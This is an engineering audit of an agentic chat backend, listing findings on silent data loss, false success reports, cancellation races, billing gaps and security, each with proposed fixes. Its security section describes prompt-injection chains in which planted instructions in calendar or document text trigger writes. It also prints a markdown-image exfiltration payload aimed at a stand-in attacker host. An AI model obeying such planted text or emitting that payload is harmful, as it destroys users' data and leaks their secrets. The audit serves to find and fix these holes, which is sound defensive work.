<!-- apps/web/docs/technical/audits/AGENTIC_CHAT_BACKEND_AUDIT_2026-07-01_DEEP.md -->

# Agentic Chat Backend — Deep Audit (Companion) — 2026-07-01

**Companion to:** `AGENTIC_CHAT_BACKEND_AUDIT_2026-07-01.md` (the original). That doc's 6 top findings + lower-priority list still stand; this one goes deeper and does **not** re-report them except where a new angle changes the severity.

**Method:** Six parallel deep-dive passes, each reading the actual source (not the prior doc): (1) race conditions & state consistency, (2) tool-execution / write path, (3) context assembly correctness + cost, (4) security across every agent endpoint, (5) LLM integration robustness + cost, (6) turn-loop orchestrator edge cases (bugs _inside_ the 2026-06-24 fixes, not confirmation they exist). Every finding is cited `file:line` and marked **CONFIRMED** (code path traced) or **SUSPECTED** (plausible, not fully verified).

**Independently spot-verified while writing this doc:**

- Document append/merge → full-replace data loss — `ontology-write-executor.ts:2018-2024`. ✅
- `timing_metrics` has no RLS — create migration `20260130_235900` + the only other migration touching it (`20260428000015`, adds a column) confirm no `ENABLE ROW LEVEL SECURITY`. ✅
- `prompt_cache_key` is never sent on the streaming path — `openrouter-v2-service.ts:1576-1588` omits it; it appears only on JSON/text/moonshot paths (`:905, :1226, :1432, :1681`). ✅

**Status (2026-07-02):** Waves 1 and 2 (all batches) implemented **and committed** (commits `734b291a`, `c95d3f5b`, `00631df2`). 18 of the ~60 new findings are FIXED — the entire data-integrity / false-success / cancellation / durability / LLM-robustness / transactional-create cluster. One Wave 2 tail item (D4b, lambda lifecycle) is intentionally held for a go/no-go. **The next pass is Wave 3 — Security hardening** (highest-severity remaining: the two injection chains + access/trust boundaries); it is planned in detail under "Fix waves." Findings marked **FIXED** carry a one-line note on what shipped.

---

## The headline

The auth/scope _core_ is genuinely well-built (fail-closed op allowlists, grant-bound OAuth with PKCE + refresh-family burn, per-handler project fencing, RLS-scoped chat tool execution, atomically-consumed prepared-prompt nonces, an atomic single-running-turn guard). The risk is not there. It concentrates in five themes:

1. **Silent data loss & false success** — the worst class. Writes that destroy data or fail while the model (and user) are told "done."
2. **Cancellation is cosmetic on the write path** — cancel returns instantly, but in-flight tool writes keep running and land after the user was told the turn stopped, producing duplicate mutations on retry.
3. **Durability gaps under lambda death** — applied writes with zero record, sessions stuck "running," detached turns whose survival is accidental (no `waitUntil`).
4. **The action side of interactive chat lacks the policy layer that Agent Runs already have** — prompt-injection → immediate write with no approval, plus a zero-click image-exfiltration channel.
5. **Cost is mostly invisible and partly un-metered** — `prompt_cache_key` is dead code, cancelled turns don't bill, unbounded fallback fetches, full prompts persisted every turn with no retention.

---

## Severity summary (new findings only)

| #   | Finding                                                                                                                               | Severity     | Status                                                                 |
| --- | ------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ---------------------------------------------------------------------- |
| D1  | Document append/merge silently degrades to full REPLACE on read failure                                                               | **CRITICAL** | **FIXED (W1)** — throws on read fail                                   |
| D2  | `merge_llm` merge capped at 2000 tokens → long docs truncated on merge                                                                | HIGH         | **FIXED (W2)** — scales tokens + safe fallback                         |
| D3  | Abort never threaded into tool execution → write-after-cancel + duplicate on retry                                                    | HIGH         | **FIXED (W2)** — signal wired; idempotency→W3                          |
| D4  | Tool-execution rows + assistant msg persisted only at end-of-turn → killed lambda leaves applied writes with no record                | HIGH         | **FIXED (W2)** — incremental persist + heartbeat                       |
| D5  | Three writers full-overwrite `agent_metadata` JSONB → cancel hint clobbered, stop button no-ops                                       | HIGH         | **FIXED (W2)** — all 3 via merge RPC                                   |
| D6  | Finalization guard counts `ok:false` gateway writes as success → false "I completed the change"                                       | HIGH         | **FIXED (W1)** — ok-aware in 4 spots                                   |
| D7  | Multi-entity creates non-transactional (task+edges+assignees, project instantiate) → partial state reported as failure → dup on retry | HIGH         | **FIXED (W2)** — atomic create RPC + idempotency; instantiate deferred |
| D8  | Every chat pass capped at 2000 completion tokens; `finish_reason:'length'` unhandled; truncated tool calls silently dropped           | HIGH         | **FIXED (W2)** — 8k cap + length continuation                          |
| D9  | `prompt_cache_key` never forwarded on the primary streaming path (dead)                                                               | HIGH         | **FIXED (W1)** — `session_id`+key wired                                |
| D10 | Cancelled/errored streams never log usage → billing undercount                                                                        | HIGH         | **FIXED (W1)** — logs `failure` row                                    |
| D11 | Mid-stream OpenRouter `error` frames swallowed → truncated answer shipped as complete success                                         | HIGH         | **FIXED (W2)** — error frames throw                                    |
| S1  | Prompt-injection → immediate data mutation, no human approval (commit-by-default in chat)                                             | **CRITICAL** | CONFIRMED                                                              |
| S2  | Markdown `<img>` renders remote URLs → zero-click exfiltration                                                                        | HIGH         | CONFIRMED                                                              |
| S3  | On-demand tool materialization has no read/write gate; auto-executes destructive ops same-round                                       | HIGH         | CONFIRMED                                                              |
| S4  | `timing_metrics` table has no RLS → cross-tenant metadata read/write                                                                  | HIGH         | **FIXED (W1)** — RLS migration (verify live)                           |
| S5  | Bootstrap link stores plaintext bearer token at rest, never reaped                                                                    | HIGH         | CONFIRMED                                                              |
| C1  | Ontology-context chats bypass the member-access gate → hydrate public projects you're not a member of                                 | HIGH         | CONFIRMED                                                              |
| C2  | Client-supplied prewarm context trusted verbatim into system prompt + persisted (session poisoning)                                   | HIGH         | CONFIRMED (×2 passes)                                                  |
| O2  | `looksLikeExplicitMutationRequest` misfires both ways ("update me on…" nukes correct answers; "assign/postpone/merge" slip through)   | MEDIUM-HIGH  | CONFIRMED                                                              |
| …   | (full set below, grouped by theme)                                                                                                    |              |                                                                        |

---

## Theme 1 — Silent data loss & false success (fix first)

### D1. Document append/merge silently degrades to full REPLACE on read failure — CRITICAL, CONFIRMED ✅ — FIXED (W1)

`apps/web/src/lib/services/agentic-chat/tools/core/executors/ontology-write-executor.ts:2012-2024` (`resolveTextWithStrategy`), used by `updateOntoDocument` at `:1500-1522`.

On `update_strategy: "append"` or `"merge_llm"`, the code loads existing content and, **on any loader failure, returns only the new content** (`:2023`), which is then PATCHed as the document's _full_ `content` (`:1521`). A transient timeout/500/cold-start on the existing-content GET destroys the entire document body — and the tool reports success. Verified: the catch block at `:2018-2024` returns `sanitizedNew` with only a `logger.warn`.

**Fix:** on loader failure under append/merge, **throw** — a failed read must abort a strategy-dependent write, never silently convert it to replace.

### D2. `merge_llm` merge capped at 2000 tokens → long documents truncated on merge — HIGH, CONFIRMED cap — FIXED (W2)

`ontology-write-executor.ts:2094-2106` (`composeContentUpdateWithLLM`, `maxTokens: 2000`); output used verbatim as the new full `content` (`:2038-2043` → `:1521`). A document over ~6-8KB being `merge_llm`-updated forces the merge model to re-emit the whole doc under a 2000-token ceiling → `length` stop truncates it → truncated text replaces the whole document. No `finish_reason:'length'` guard in `generateTextDetailed`. Secondary: merge-LLM failure silently falls back to append (`:2044-2056`) — different semantics, reported as success.

**Fix:** scale `maxTokens` to existing length (or chunk); reject/flag on `length` finish or when merge output is materially shorter than the source.

### D6. Finalization guard counts `ok:false` gateway writes as success → false "I completed the change" — HIGH, CONFIRMED — FIXED (W1)

`turn-supervisor/finalization-guard.ts:441-454` classifies success via `execution.result.success === true`; same raw flag at `stream-orchestrator/index.ts:1769-1775` (`turnHadUnfulfilledMutationIntent`) and `:1515` (supervisor `successfulWrites`). But the executor returns `success:true` whenever the handler doesn't throw (`tool-executor.ts:226-233`) — a gateway envelope can carry `{ok:false}` inside a `success:true` result. That's exactly why `didGatewayExecSucceed` (`round-analysis.ts:269-278`) exists and re-checks `payload.ok === true`, and why the 2026-06-24 repair layer is `ok`-aware (`repair-instructions.ts:879-883`) — **but the finalization guard, the mutation-intent check, and the supervisor counter are not.**

Result: an op-level write failure (`success:true, ok:false`) → guard synthesizes _"I completed the requested change."_, `turnHadUnfulfilledMutationIntent` reads false so the honest incomplete path is bypassed, and the supervisor stops protecting the turn. This is the inverse of the 2026-06-24 "searched but never updated" bug — now it lies the other direction.

**Fix:** use `didGatewayExecSucceed(execution)` everywhere success is judged (`finalization-guard.ts:442`, `index.ts:1774`, `:1515`).

### D7. Multi-entity creates are non-transactional → partial state reported as failure → duplicates on retry — HIGH, CONFIRMED — FIXED (W2, task-create; instantiate deferred; tests pending)

- **`create_onto_task`** — `routes/api/onto/tasks/create/+server.ts:281-307`: task row inserted first, then `autoOrganizeConnections` (`:301-307`) + assignee sync (`:320-340`). An `AutoOrganizeError`/`TaskAssignmentValidationError` is caught (`:405-435`) and returned as an **error** — but the task row persists (no cleanup). Model told "failed" → retries → duplicate tasks, each missing plan/goal edges. (The _update_ path was fixed with `onto_task_update_atomic`, `tasks/[id]/+server.ts:525-560` — create was not.)
- **`create_onto_project` (instantiate)** — `packages/shared-agent-ops/src/ontology/instantiation.service.ts:316-339`: project row inserted first, then goals/plans/tasks/docs/edges sequentially; compensation (`cleanupPartialInstantiation:1125-1163`) is best-effort and relies on FK cascade; a mid-way lambda death leaves a fully-visible half-built project.
- **Calendar event create** — see D14.

**Fix:** wrap task-create (task + edges + assignees) in an RPC like the update path; for instantiate, single RPC transaction or insert the project row last / flag incomplete until finalized.

### D14. Task→event edge write errors discarded → link-failure reported as full success — MEDIUM, CONFIRMED — FIXED (W1)

`executors/calendar-executor.ts:855-875` (create) & `:943-962` (update): the `onto_edges` select and insert never destructure `{ error }`. Supabase clients don't throw — a failed `has_event` edge insert (RLS/FK) is silently dropped; the tool returns the created event and the model reports full success, but the task↔event link never exists. The ignored select error also risks a duplicate-insert.

**Fix:** check `error` on both calls; surface `link_created: false` at minimum.

### D15. Invalid `state_key` on `update_onto_task` silently dropped → no-op PATCH reported as "Updated" — MEDIUM, CONFIRMED — FIXED (W1)

`base-executor.ts:341-373` — `normalizeTaskState('cancelled' | 'wont_do' | unmapped)` returns `undefined` (warn only). `ontology-write-executor.ts:1358-1360` assigns that `undefined`; the `Object.keys(updateData).length === 0` guard (`:1391`) passes because the key exists; `JSON.stringify` (`:1395-1397`) then drops it → empty `{}` PATCH → route bumps `updated_at` only and 200s. Tool result: _"Updated ontology task…"_ for a state change that never happened. (Looks like the "unfinished turn" symptom but is a distinct bug — the route's own 400 at `tasks/[id]/+server.ts:467-473` never fires because the key is stripped before serialization.)

**Fix:** throw a validation error when `normalizeTaskState` returns `undefined`.

### D16. Read-modify-write with no version guard → concurrent human edits lost — MEDIUM, CONFIRMED

`tag_onto_entity` and append/merge all GET-then-PATCH the _full_ field with no `updated_at`/etag precondition: task description `ontology-write-executor.ts:1705-1714`, goal `:1765-1774`, document content `:1824-1831`, and `resolveTextWithStrategy` append `:2031-2033`. A human editing the same doc between the tool's read and write is silently overwritten; drift detection exists only on the _staged_ worker path, not the direct chat path.

**Fix:** send `expected_updated_at` and 409 on mismatch (the change-set path already proves the snapshot-compare pattern).

---

## Theme 2 — Cancellation is cosmetic on the write path

### D3. Abort never threaded into tool execution → write-after-cancel + duplicate on retry — HIGH, CONFIRMED (three independent passes) — FIXED (W2)

`agentic-chat/execution/tool-execution-service.ts:1589-1599` (`executeWithTimeout`) and `:510-529` (abort race) are bare `Promise.race`s — the losing `execPromise` (`this.toolExecutor(...)`) **keeps running**; no signal reaches the underlying `fetch`/Supabase call (`base-executor.ts:153-237` sends no abort signal). Orchestrator also confirms: `params.toolExecutor` takes no signal (`stream-orchestrator/index.ts:110-113, 1448, 1487`).

Failure: user hits stop → cancel acked ≤750ms → orchestrator records the in-flight tool as `success:false, 'Operation cancelled'` → the actual `onto.task.update` completes seconds later. The persisted `chat_tool_executions` row says failed; the entity was mutated. Next turn's "interrupted tool history" (`session-service.ts:323-359`) tells the model the write failed → model retries → **duplicate mutation**. There is no idempotency key on any create route (`tasks/create/+server.ts` has none), so retries are not deduped.

Worse (orchestrator #7): `attemptDocOrganizationRecovery` (`index.ts:425-577`) has **no** `signal?.aborted` check — after triggering it loops `onto.document.tree.move` once per unlinked doc (`:545-560`); a user who cancels mid-recovery keeps seeing writes commit, then gets a success summary on a turn they cancelled.

**Fix:** thread `AbortSignal` into the tool executor and into `apiRequest`'s `fetch`; add an idempotency key (per `tool_call` id) honored by create routes; check `signal?.aborted` at the top of `executeSyntheticDirectTool` and per move-loop iteration.

### D5. Three writers full-overwrite `chat_sessions.agent_metadata` JSONB → cancel hint clobbered, stop button no-ops — HIGH, CONFIRMED — FIXED (W2)

An atomic merge RPC exists (`merge_chat_session_agent_metadata`, migration `20260428000005`) and most stream writers use it — but three paths do read-modify-write of the **whole column**:

1. **Cancel endpoint** — `stream/cancel/+server.ts:76-118` (SELECT → JS merge → UPDATE whole column).
2. **`resolveSession`** — `agentic-chat-v2/session-service.ts:426-448`, fires on _every_ project-context turn and prewarm (runs at stream start `+server.ts:2082`).
3. **Inbox session refresh** — `lib/server/inbox-chat-session.service.ts:552-570`.

The client's supersede flow waits **≤120ms** for the cancel ack before sending the next message (`agent-chat-stream-controller.svelte.ts:597-602`). Interleaving: cancel writes the hint under `fastchat_cancel_hints_v1` → the new POST's `resolveSession` overwrites the whole column from its pre-hint snapshot → **hint erased** → the cancel watcher (DB-only poll, `+server.ts:536-589`) never sees it → **turn A keeps executing tools the user tried to stop.** The same races silently revert concurrent RPC merges of `fastchat_context_cache` / `fastchat_domain_state` / `agent_state`.

**Fix:** route every writer through `merge_chat_session_agent_metadata`; for the cancel hint use a key-level merge or a dedicated `chat_stream_cancel_signals` table keyed by `(user_id, stream_run_id)`; in `resolveSession` merge `{focus}` via RPC and only when focus changed.

### O8. `isAbortLikeError` substring-matches real provider failures into silent "cancelled" turns — MEDIUM, CONFIRMED — FIXED (W2)

`stream-orchestrator/index.ts:322-333` treats any error whose message contains `aborted` / `request aborted` / `stream closed` as cancellation **even when `signal?.aborted` is false** (`:1725` is an OR). Undici/fetch timeouts ("The operation was aborted") and provider socket drops ("stream closed") therefore end the turn as `cancelled:true` — no error surfaced, no retry, persisted as user-interrupted.

**Fix:** require `signal?.aborted === true` (or `error.name === 'AbortError'` _and_ signal aborted) for the cancelled path; otherwise rethrow as a real error.

---

## Theme 3 — Durability under lambda death

### D4. Tool-execution rows + assistant message persisted only at end-of-turn → killed lambda leaves applied writes with no record — HIGH, CONFIRMED — FIXED (W2)

`persistToolExecutionRows` runs only _after_ `streamFastChat` returns (`stream/+server.ts:3799-3811` cancelled, `:4004-4015` completed); the assistant message likewise (`:3785-3796` / `:3981-3992`). A mid-turn lambda kill (freeze at `maxDuration`, OOM, deploy) leaves: user message row exists, **no** assistant message, **no** `chat_tool_executions` rows, `chat_turn_runs` stuck `running` — but every tool side effect already applied. The interrupted-turn recovery machinery keys off an interrupted assistant message + execution rows, neither of which exists → the next turn's model has zero evidence the writes happened → "create 3 tasks" + death + retry = 6 tasks. No reconciliation job exists (the only stale-`running` sweep is inline in the next POST _for the same session_, `:2137-2191`; nothing in the worker touches `chat_turn_runs`).

**Fix:** persist each tool execution incrementally right after `onToolResult` (the callback already exists, `:3285`), keyed idempotently by `(turn_run_id, sequence)`; add a `last_progress_at` heartbeat on `chat_turn_runs` so a sweeper can distinguish dead vs alive.

### D4b. Detached-turn survival is accidental — no `waitUntil`; detach path never closes the stream; sessions hard-block up to 285s — HIGH, code CONFIRMED / freeze behavior SUSPECTED

The turn runs in `void (async ()=>{})()` (`stream/+server.ts:1913`) after `return agentStream.response`. The only thing keeping the invocation alive is the un-closed `TransformStream` readable — **no `waitUntil` anywhere** in the agent stream path (the codebase knows the pattern; this route doesn't use it). On client disconnect the `finally` deliberately skips `agentStream.close()` (`:4337-4339`). A stuck `running` row blocks every new message ("still finishing the previous response") until age ≥ `FASTCHAT_DETACHED_TURN_MAX_DURATION_MS` (285s) — and only because the _next_ POST sweeps it; the client has no handler for `active_turn_running`.

**Fix:** register the IIFE promise with `event.platform?.context?.waitUntil`; close the stream even when detached; add a cron sweeper keyed off the D4 heartbeat.

### D4c. `TurnObservabilityWriter.flush()` is dead code on the live path → nondeterministic loss of the rows D4's recovery depends on — MEDIUM, CONFIRMED — FIXED (W2)

The `finally` awaits only `flushTurnEvents()` (`stream/+server.ts:4336`), never `flush()` (the method that awaits `detachedTasks`, `turn-observability-writer.ts:413-419`). Un-awaited at close: `chat_tool_executions` inserts, user-message finalize + attachment links, session context sync, `timing_metrics` insert, `chat_turn_runs` patches, and a post-done `agent_state` reconciliation (an LLM call). Once `close()` resolves the instance can freeze with these pending.

**Fix:** `await observabilityWriter.flush()` before `close()` (bounded by a timeout), or hand `detachedTasks` to `waitUntil`.

### D9b. Commit-mid-crash leaves the run stuck `running` with a partially-applied change set and no recovery — MEDIUM, CONFIRMED — FIXED (W2)

`change-set.ts:339-359` atomically claims `proposal_ready → running` (good, prevents double-commit), then applies changes **sequentially with no transaction** (`:382-493`), then writes terminal status (`:525-539`). A process death between claim and final update applies some changes, never updates the change-set JSON, and every future commit hits `status !== 'proposal_ready'` → permanent CONFLICT. Nothing resets it (not a queue job, so stalled-job recovery doesn't apply).

**Fix:** persist per-change results incrementally (or a `commit_started_at` + a stalled-commit sweep reconciling from the `agent_tool_executions` rows already written per change at `:405-419`).

> **Drift note (answers the original doc's open question):** commit-time drift detection _does_ exist — `verifyStagedChangeFreshness` (`change-set.ts:173-236`) compares staged `before` vs current rows. But it silently skips when `before` is absent, when `entity_type` isn't one of 7 core kinds, and for **all creates** — so staged `edge.link`, doc-tree moves, and creates commit with zero freshness checks (`op-execution-gateway.staging.ts:73-100`).

---

## Theme 4 — Concurrency & state consistency (from the race audit)

- **F5. Supersede structurally races the running-turn guard** — MEDIUM-HIGH, CONFIRMED. Sending a message while streaming → 120ms ack cap, then the new POST is rejected by the active-turn lookup / unique-index conflict before turn A finishes cancelling; the user's message disappears from the composer. Combined with D5, turn A may not even be cancelled. **Fix:** have the new POST cancel the prior turn server-side (it already finds `activeTurn` at `:2137`), or make the client retry on `active_turn_running`.
- **F7. User message persistence is fire-and-forget** — MEDIUM, CONFIRMED. `stream/+server.ts:2547-2577` `void`-detaches the user-row insert; failure only logs. An assistant reply can persist against a user message that doesn't exist → all future history is missing the user's actual request. Idempotency is check-then-insert, not a unique constraint. **Fix:** await the user insert before the LLM stream; add a unique index on `(session_id, idempotency_key)`.
- **F8. Transient cancel-hint channel is per-lambda module memory** — MEDIUM-LOW, CONFIRMED. `cancel-reason-channel.ts:25` is a module-level `Map`; the cancel POST and the streaming turn usually run on different instances, so it's best-effort; a first-turn cancel before the `session` SSE event has no `session_id` and never reaches the turn. **Fix:** make DB (or a `stream_run_id`-keyed signals table) primary.
- **F9. Zombie turn vs stale sweep** — LOW, SUSPECTED (needs freeze/thaw). The age-based sweep marks an old row `cancelled`; a thawed zombie then runs `persistFinalState` with no status guard (`turn-observability-writer.ts:216-220`), overwriting `cancelled` with `completed` and interleaving two turns' messages. **Fix:** guard terminal updates with `.eq('status','running')`.
- **F10. Prewarm mutates live session scope mid-turn** — LOW, CONFIRMED. Prewarm's `resolveSession` can flip `context_type`/`entity_id` on the session row while a turn streams. **Fix:** prewarm should be read-only on session scope.

---

## Theme 5 — Security (action side lacks the policy layer)

### S1. Prompt-injection → immediate data mutation, no human approval — CRITICAL, CONFIRMED

Launch surfaces preload reads + writes together (`gateway-surface.ts:80-89` daily_brief→global_write, `:112-151` project_write/calendar); chat writes commit immediately (`ontology-write-executor.ts:1339-1404`); staging/review is opt-in and only for background Agent Runs (`dispatch.ts:179` `reviewRequired=false`; worker `agentRunWorker.ts:656-657`). `packages/shared-agent-ops/src/policy.ts` scope enforcement is **not** consulted on the chat path. So "mark all tasks done / delete the launch event" planted in a calendar description or shared doc body executes with zero approval when the user asks the brief/project chat anything.

**Fix:** route chat writes through `policy.ts`; gate destructive/bulk ops behind explicit confirmation; default to commit-review for any turn that ingested external/third-party content.

### S2. Markdown `<img>` renders remote URLs → zero-click exfiltration — HIGH, CONFIRMED

Assistant messages render via `{@html renderMarkdown(...)}` (`AgentMessageList.svelte:314,351`); `sanitizeOptions` allows `img[src]` with no scheme restriction (`utils/markdown.ts:39,50`). An injected instruction to emit `![](https://attacker/leak?d=SECRET)` auto-fetches attacker.com on render. Chains directly with S1.

**Fix:** deny remote `img` in assistant-rendered markdown (first-party/proxy only) or set CSP `img-src` on the chat surface. (`renderBlogMarkdown` is a separate trusted profile — fine.)

### S3. On-demand tool materialization has no read/write gate; auto-executes destructive ops same-round — HIGH, CONFIRMED

`tool_search` searches the whole registry minus 4 read tools (`registry/tool-search.ts:85-148`); the on-miss path loads any tool by bare name and auto-runs it the same round (`stream-orchestrator/index.ts:1371-1466`); `materializeGatewayTools` filters only dedup + flag, no `kind:read|write` gate (`gateway-surface.ts:319-349`). `delete_calendar_event` is loadable+executable mid-turn from a nominally read-only context; the comment claiming deletes "keep their confirm-first path" is false (grep = 0 hits). The lean surface is a latency optimization, not a security boundary.

**Fix:** enforce a write-op allowlist in materialization keyed to the turn's scope; require confirmation before executing a just-materialized destructive op.

### S4. `timing_metrics` table has no RLS → cross-tenant metadata read/write — HIGH, CONFIRMED ✅ — FIXED (W1, verify live)

`supabase/migrations/20260130_235900_add_timing_metrics.sql:4-47` creates the table with no `ENABLE ROW LEVEL SECURITY` and no policy; the only later migration touching it (`20260428000015`) adds a column. With RLS off, default PostgREST grants let any authenticated user `SELECT/INSERT/UPDATE` every user's rows (session/project/entity UUIDs, message lengths, prepared-prompt IDs, timing metadata — no message bodies).

**Fix:** `ALTER TABLE timing_metrics ENABLE ROW LEVEL SECURITY;` + service-role ALL + `user_id = auth.uid()` policies. Live check: `select relrowsecurity from pg_class where relname='timing_metrics';`

### S5. Bootstrap link stores plaintext bearer token at rest, never reaped — HIGH, CONFIRMED

`agent-call/bootstrap-link.service.ts:176-184` inserts `payload:{ bearer_token }` in plaintext — the only unhashed copy of a `boca_` caller credential. Expired rows never deleted (410 on read, `:231-235`); retention cron reaps only OAuth artifacts; revoke doesn't clear the row. Also **S8: bootstrap link is multi-use within a 30-min TTL and the token travels in the URL path** fetched unauthenticated (`bootstrap/[setupToken]/+server.ts:10`), landing in CDN/proxy logs and agent transcripts.

**Fix:** single-use atomic consume; delete on fetch + `.lt('expires_at', now())` in the cron; encrypt the payload (reuse `calendar-token-crypto`).

### Other security (medium/low)

- **S6. No rate limiting / per-user concurrency cap** on the v2 stream, gateway, or bootstrap routes — MEDIUM. Global limiter is commented out (`hooks.server.ts:37`); only a per-_session_ single-turn guard exists → unlimited concurrent streams per user (each `maxDuration:300`) = cost/DoS; unauthenticated gateway/bootstrap floods also write `security_events` rows. **Fix:** per-user concurrency cap + token bucket; reuse `checkOAuthRateLimit` on gateway/bootstrap.
- **S7. Archived/out-of-scope project fence bypass on `onto.project.update`** — MEDIUM, CONFIRMED. `op-execution-gateway.entity-access.ts:141-149` + `:26-96`: when the target isn't in scoped `projectMap`, the fallback checks only user-level ownership and never consults `scope.project_ids`; `deleted_at IS NULL` is also dropped under `includeArchived`. An external caller scoped to project A can update any project B the _user_ owns (incl. soft-deleted). **Fix:** require `scope.project_ids` membership in the fallback; re-apply `deleted_at IS NULL`.
- **S9. Full tool arguments (document bodies / PII) logged to prod** — MEDIUM. `stream/+server.ts:3406-3412` (`toolArgsRaw`), `:1110/:1143` (full toolCall on emit failure), `tool-arguments.ts:284-297` (`console.warn` full args, not dev-gated). Validation failures are routine, so this fires often into Vercel logs. **Fix:** log `previewToolArguments()` (280 chars) + `{toolName, toolCallId}` only.
- **S10. `chat_prompt_snapshots` persists the full prompt every turn, no retention** — MEDIUM. `stream/+server.ts:2951-3036` + `prompt-observability.ts:381-400`: full `system_prompt`, `model_messages`, `context_payload`, and a duplicate `rendered_dump_text`, forever. RLS is correct (admin-only) so this is retention/blast-radius, incl. since-deleted content (GDPR). Same class: **S11** `chat_tool_executions`/`chat_turn_events` full args+results; **S12** `cleanup_expired_agentic_chat_prepared_prompts()` has zero callers (`20260502000002:97-117`). **Fix:** sample/env-gate; drop `rendered_dump_text`; schedule retention deletes.
- **S13. Postgres `details`/`hint` forwarded verbatim into model-facing tool errors** — LOW/MEDIUM. `shared/error-utils.ts:28-45` JSON-stringifies the whole DB error; a global unique-constraint violation can echo another tenant's value (`Key (email)=(victim@…) already exists`) into the model (and S2's render surface). **Fix:** strip `details`/`hint`; generic message, detail to logs only.
- **S14. Worker Agent Run tool results lack the untrusted-data notice** the web path applies — MEDIUM. `agentRunWorker.ts:1048-1051` injects `JSON.stringify(result.data).slice(0,4000)` with no wrapper; same raw Google-event pass-through in `agent-run-calendar-port.ts:500-502`. **Fix:** apply the same untrusted wrapper on the worker transcript.
- **S15. Observability INSERT policies don't verify session/turn ownership** (`20260428000015:145-200`) — LOW; forge-telemetry-with-known-session-UUID, no read gained. **S16. `web_page_visits` is a cross-user shared cache** keyed only by `normalized_url` on the admin client (`external-executor.ts:302-345`) — user A's visit to a signed/private URL serves its content to user B. **S17. Local prompt dumps have a prod escape hatch** (`FASTCHAT_LOCAL_PROMPT_DUMPS=true`, `prompt-dump-files.ts:57-88`). Plus L-tier: calendar `onto_event_id` pass-through, worker write-op schema gaps, `allowed_ops=null` fail-open to mode default, silent OpenClaw scope widening at auth, internal-error disclosure to external callers.

### C1. Ontology-context chats bypass the member-access gate — HIGH, CONFIRMED

`isProjectScopedContext` returns true only for `project` (`scope.ts:52-56`), but `resolveRpcContextType` maps `ontology`+projectId to the `project` RPC path (`:72-82`). The stream/prewarm member-access gate runs only for project-scoped contexts (`stream/+server.ts:2049`, `prewarm/+server.ts:287`) — **not for `ontology`**. Migration `20260514002000` deliberately made the RPC require _member_ access, returning NULL for a non-member on a public project — but on NULL, `loadFastChatPromptContext` silently falls through to the manual-query branch (`context-loader.ts:2988-3001` → `loadProjectContextData`), which runs plain RLS-scoped selects, and RLS explicitly allows public reads (`project_select_public` etc.). So an authenticated non-member opens an `ontology` chat on a public project's id and hydrates its full seed bundle (description, tasks, goals, docs, START HERE). A non-UUID `focusEntityId` is a deliberate lever to force the fallback (no UUID validation at the boundary).

**Fix:** run `checkProjectAccess` for any resolved projectId regardless of contextType; treat RPC-null on the project path as terminal instead of falling back to RLS queries; UUID-validate `focusEntityId`/`projectId` at the request boundary.

### C2. Client-supplied prewarm context trusted verbatim → session poisoning — HIGH, CONFIRMED (two passes)

The stream endpoint accepts `prewarmedContext` (loose object), shape-checks only (`context-cache.ts:105-122`), and if `version === 2` + `key === cacheKey` + client-supplied `created_at` < 2min, uses `context.data` **directly** as prompt context (`stream/+server.ts:2708-2713`) and **persists it into `chat_sessions.agent_metadata.fastchat_context_cache`** (`:2714-2725`), reused on later turns as the higher-priority `session_cache` source. All three gates are client-forgeable (version is a public constant, cacheKey is deterministic, created*at is client-controlled). One forged request injects attacker-authored `start_here.content` / titles / fabricated `project_intelligence` into the system prompt as \_trusted BuildOS state*, and durably poisons the session.

**Fix:** stop trusting `context.data` from the client — re-derive server-side (the `else` branch at `:2726` already does), or HMAC/nonce the payload like prepared-prompts; never persist a client-origin cache into session metadata; ignore client `created_at`.

---

## Theme 6 — LLM integration robustness & cost

### D8. Every chat pass capped at 2000 completion tokens; `finish_reason:'length'` unhandled; truncated tool calls silently dropped — HIGH, CONFIRMED ✅ — FIXED (W2)

`openrouter-v2-service.ts:1583` (`max_tokens: options.maxTokens ?? 2000`); the orchestrator call site passes no `maxTokens` (`stream-orchestrator/index.ts:804-821`). The tool lane also requests reasoning (counts against the same cap). If the cap hits mid tool-call arguments, the half-built call fails `isValidJsonObject` and is **silently dropped** (`openrouter-v2-service.ts:1958-1961`); the orchestrator has zero `finish_reason:'length'` handling and ships the truncated buffer as the final answer. This is a plausible contributor to the "searched a lot but never updated" class: a big `document.update` with a long `body_markdown` gets its args truncated and silently never happens.

**Fix:** pass explicit `maxTokens` (≥8k for synthesis) from the orchestrator; on `length` with dropped tool calls inject a repair message instead of finalizing; log dropped-invalid-tool-call events.

### D9. `prompt_cache_key` never forwarded on the primary streaming path (dead) — HIGH, CONFIRMED ✅ — FIXED (W1)

The orchestrator passes `chatSessionId` (`index.ts:811`) and `streamText` accepts it — but the streaming request body omits it (`openrouter-v2-service.ts:1576-1588`, verified). It's attached only on JSON/text paths (`:1226, :1432`) and the direct-Moonshot fallback (`:905, :1681`), gated `provider === 'moonshot'` — so even the direct-OpenAI fallback doesn't get it. On a tool loop that re-sends a growing prefix 5-16× per turn, cache-aware routing is forfeited on the path that actually runs.

**Fix:** thread `prompt_cache_key` through `buildOpenRouterChatCompletionBody` for the primary path; drop the moonshot-only gate for the OpenAI direct route.

### D10. Cancelled/errored streams never log usage → billing undercount — HIGH, CONFIRMED — FIXED (W1)

`streamText` calls `logUsage` only on the two happy paths (`:1857, :1966`); the catch/abort paths return/yield without logging and there is no `status:'failure'` insert (v2 hardcodes `status:'success'`, `:1786`). Billing credits = `ceil(total_tokens/1000)` straight from `llm_usage_logs` (`20260425000005:135-139`), so every gap is a billing gap. Since **abort is a normal end state** for chat turns, this is a structural undercount, not an edge case. Same in `getJSONResponse` parse-retries.

**Fix:** log a `status:'failure'|'cancelled'` row using the usage frame if seen, else an estimate from emitted text; same for JSON parse-retries.

### D11. Mid-stream OpenRouter `error` frames swallowed → truncated answer shipped as complete success — HIGH, CONFIRMED (code) — FIXED (W2)

The chunk parser never checks `chunk.error` (`openrouter-v2-service.ts:1876-1913`) — an upstream `{error}` frame has no `choices` → `continue` (`:1909`); `finish_reason:'error'` is captured but the `done` event still yields and usage logs `success`. The orchestrator's `done` handler doesn't inspect `finished_reason === 'error'` and takes the final-answer path (`index.ts:1044`). An upstream provider dying 40% into a synthesis ships mid-sentence text as complete, logged as `stop`/success. (Distinct from the known "non-abort error kills the turn" — here the error never surfaces.)

**Fix:** treat `chunk.error` as a yielded error (or trigger fallback if no text emitted yet); propagate `finished_reason:'error'` into the repair/retry path.

### Other LLM findings

